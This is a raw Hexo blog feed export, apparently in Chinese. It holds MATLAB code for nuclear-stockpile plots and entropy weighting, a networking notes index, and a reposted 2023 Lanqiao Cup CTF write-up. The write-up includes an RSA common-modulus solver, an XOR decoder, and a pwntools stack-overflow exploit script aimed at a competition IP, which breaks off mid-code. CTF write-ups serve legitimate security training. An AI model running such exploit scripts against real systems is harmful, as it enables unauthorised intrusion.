number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">220</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">210</span><span class="token punctuation">,</span><span class="token number">205</span><span class="token punctuation">,</span><span class="token number">195</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%GBR  </span><span class="token number">j</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10457</span><span class="token punctuation">,</span><span class="token number">10027</span><span class="token punctuation">,</span><span class="token number">8570</span><span class="token punctuation">,</span><span class="token number">8360</span><span class="token punctuation">,</span><span class="token number">7853</span><span class="token punctuation">,</span><span class="token number">5709</span><span class="token punctuation">,</span><span class="token number">5273</span><span class="token punctuation">,</span><span class="token number">5113</span><span class="token punctuation">,</span><span class="token number">5066</span><span class="token punctuation">,</span><span class="token number">4897</span><span class="token punctuation">,</span><span class="token number">4881</span><span class="token punctuation">,</span><span class="token number">4804</span><span class="token punctuation">,</span><span class="token number">4717</span><span class="token punctuation">,</span><span class="token number">4571</span><span class="token punctuation">,</span><span class="token number">4018</span><span class="token punctuation">,</span><span class="token number">3822</span><span class="token punctuation">,</span><span class="token number">3785</span><span class="token punctuation">,</span><span class="token number">3805</span><span class="token punctuation">,</span><span class="token number">3750</span><span class="token punctuation">,</span><span class="token number">3708</span><span class="token punctuation">,</span><span class="token number">3708</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%USA </span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>e<span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>f<span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>g<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>h<span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Linear, color, marker  </span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%Determine the x-axis and y-axis block plot size </span><span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'XTick'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">22</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%xAxis range 2002-2022, interval 5  </span><span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'YTick'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">2000</span><span class="token operator">:</span><span class="token number">12000</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%yShaft range 0-12000 with 2000 intervals </span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'CHN'</span><span class="token punctuation">,</span><span class="token string">'FRA'</span><span class="token punctuation">,</span><span class="token string">'IND'</span><span class="token punctuation">,</span><span class="token string">'ISR'</span><span class="token punctuation">,</span><span class="token string">'PRK'</span><span class="token punctuation">,</span><span class="token string">'PAK'</span><span class="token punctuation">,</span><span class="token string">'RUS'</span><span class="token punctuation">,</span><span class="token string">'ZAF'</span><span class="token punctuation">,</span><span class="token string">'GBR'</span><span class="token punctuation">,</span><span class="token string">'USA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Callout in the upper right corner  </span><span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'Year'</span><span class="token punctuation">)</span> <span class="token comment">%xDescription of axis coordinates </span><span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'Changes in nuclear weapons stocks'</span><span class="token punctuation">)</span> <span class="token comment">%yDescription of axis coordinates  </span><span class="token function">title</span><span class="token punctuation">(</span>"Nuclear weapons change line graph"<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="code-3-Entropy-weight-law"><a href="#code-3-Entropy-weight-law" class="headerlink" title="code 3:Entropy weight law"></a>code 3:Entropy weight law</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token punctuation">[</span>n1<span class="token punctuation">,</span>m1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">C</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%CConstitute a matrix  </span><span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1 <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">./</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">end</span><span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1 <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token keyword">if</span> <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span>  <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1E-6</span> <span class="token keyword">end</span><span class="token keyword">end</span> <span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">e</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">P</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">P</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%ultiply  </span><span class="token keyword">end</span> d<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>e <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1<span class="token function">wn</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">sum</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token keyword">end</span>  s<span class="token operator">=</span>wn<span class="token operator">*</span>P<span class="token operator">'</span><span class="token punctuation">;</span>s<span class="token operator">=</span>s<span class="token operator">'</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>ssort<span class="token punctuation">,</span>id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span><span class="token comment">%Get the result</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工程相关整理汇总</title>
      <link href="/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/"/>
      <url>/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h3><blockquote><p>负责定义传输数据的物理媒体和连接的电气特性。物理层关注的是比特流的传输，它定义了硬件设备之间的接口和传输媒体的特性，如电压、电流和光信号等 </p></blockquote><p>物理层规程</p><h3 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h3><h4 id="常规特性："><a href="#常规特性：" class="headerlink" title="常规特性："></a>常规特性：</h4><ul><li><h5 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a><a href="https://shierjinghuang.github.io/2022/11/21/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/">生成树协议</a></h5></li></ul><h4 id="高级特性："><a href="#高级特性：" class="headerlink" title="高级特性："></a>高级特性：</h4><ul><li><h5 id="生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP" class="headerlink" title="[生成树的改进 RSTP与MSTP](https://shierjinghuang.github.io/2023/03/06/生成树的改进 RSTP与MSTP/)"></a>[生成树的改进 RSTP与MSTP](<a href="https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B">https://shierjinghuang.github.io/2023/03/06/生成树的改进</a> RSTP与MSTP/)</h5></li></ul><h3 id="网际层："><a href="#网际层：" class="headerlink" title="网际层："></a>网际层：</h3><blockquote><p>网际层主要负责在不同的网络之间进行数据包的路由和转发，以确保数据能够从源主机传递到目标主机。该层定义了数据包的传输路径，决定了最佳的路径选择，以实现端到端的通信 </p></blockquote><h4 id="常规特性：-1"><a href="#常规特性：-1" class="headerlink" title="常规特性："></a>常规特性：</h4><blockquote><p>网际层常规特性包含日常学习中的关于网络协议的各种内容</p></blockquote><ul><li><h5 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/">网际协议IP</a></h5></li><li><h5 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li><li><h5 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/">地址解析协议 ARP</a></h5></li><li><h5 id="链路状态路由协议IS-IS"><a href="#链路状态路由协议IS-IS" class="headerlink" title="链路状态路由协议IS-IS"></a><a href="https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/">链路状态路由协议IS-IS</a></h5></li><li><h5 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a><a href="https://shierjinghuang.github.io/2022/11/16/IGMP/">Internet组管理协议IGMP</a></h5></li><li><h5 id="动态主机配置协议DHCP-1"><a href="#动态主机配置协议DHCP-1" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li></ul><h4 id="高级特性：-1"><a href="#高级特性：-1" class="headerlink" title="高级特性："></a>高级特性：</h4><blockquote><p>IPv6协议栈： IPv6协议栈是指一套软件和硬件组件，用于实现和支持IPv6协议的网络通信。它包括各种层次的协议、服务和功能，以确保设备能够正确地使用IPv6进行通信 </p></blockquote><ul><li><p><strong><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议结构</a></strong></p></li><li><h5 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a><a href="https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/">IPv6过渡技术</a></h5></li></ul><ul><li><h5 id="IGP高级特性"><a href="#IGP高级特性" class="headerlink" title="IGP高级特性"></a><a href="https://shierjinghuang.github.io/2024/01/01/IGP%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/">IGP高级特性</a></h5><blockquote><p>IGP高级特性包括多种快速收敛和保护机制，用于降低网络故障导致的流量丢失，以及路由选路及路由信息的控制，能够减少特定路由器路由表的大小</p></blockquote></li><li></li></ul><h3 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h3><ul><li><h5 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a><a href="https://shierjinghuang.github.io/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/">传输层协议TCP与UDP</a></h5></li></ul><h3 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h3><ul><li><h5 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议:"></a><a href="https://shierjinghuang.github.io/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/">RIP协议</a>:</h5><blockquote><p>rip是被当作一个应用层进程来实现的，所以它能在一个标准套接字上发送和接收报文，并且使用一个标准的运输层协议。RIP是一个运行在UDP上的应用层协议</p></blockquote></li><li><h5 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a><a href="https://shierjinghuang.github.io/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/">超文本传输协议HTTP</a></h5></li><li><h5 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a><a href="https://shierjinghuang.github.io/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/">文件传输协议FTP</a></h5></li></ul><h3 id="汇总："><a href="#汇总：" class="headerlink" title="汇总："></a>汇总：</h3><ul><li><p><a href="https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/">IPV4网络协议分析汇总</a></p></li><li><p><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议部分</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HCIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年蓝桥杯网络安全大赛</title>
      <link href="/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年蓝桥杯网络安全大赛"><a href="#2023年蓝桥杯网络安全大赛" class="headerlink" title="2023年蓝桥杯网络安全大赛"></a>2023年蓝桥杯网络安全大赛</h1><p>[TOC]</p><h2 id="WP部分"><a href="#WP部分" class="headerlink" title="WP部分"></a>WP部分</h2><blockquote><p>怎么说呢因为蓝桥杯网络安全赛事的一些奇怪操作我没有报名，队内大佬参加并拿到了非常优秀的成绩，这是直接转的人家WP</p></blockquote><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><h4 id="禁止访问"><a href="#禁止访问" class="headerlink" title="禁止访问"></a>禁止访问</h4><p>根据源代码提示，HackBar直接修改请求头Client-IP： </p><img src=".\蓝桥杯网络安全大赛\禁止访问.png" style="zoom: 33%;" /><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>WireShark找到flag.zip： </p><img src=".\蓝桥杯网络安全大赛\流量分析.png" style="zoom:50%;" /><p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解： </p><img src=".\蓝桥杯网络安全大赛\压缩包密码爆破.png" style="zoom:50%;" /><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><h4 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h4><p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CCyberChef.png"></p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA共模攻击：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *import gmpy2import randomrandom.seed(123456)e1 &#x3D; random.randint(100000000, 999999999)e2 &#x3D; 65537n &#x3D;7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957m1 &#x3D;3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363m2 &#x3D;1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)if s &lt; 0:s &#x3D; -sm1 &#x3D; gmpy2.invert(m1, n)if t &lt; 0:t &#x3D; -tm2 &#x3D; gmpy2.invert(m2, n)m1 &#x3D; gmpy2.powmod(m1, s, n)m2 &#x3D; gmpy2.powmod(m2, t, n)m &#x3D; m1 * m2 % nflag &#x3D; long_to_bytes(m)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag： </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CRC4.png"></p><h4 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h4><p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。 </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CXOR.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'SEcRET7'</span>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> enc<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># p = process('./pwn')</span><span class="token comment"># libc = ELF('../../glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.200.77.68'</span><span class="token punctuation">,</span> <span class="token string">'12451'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('./libc-2.27.so')</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> num <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token 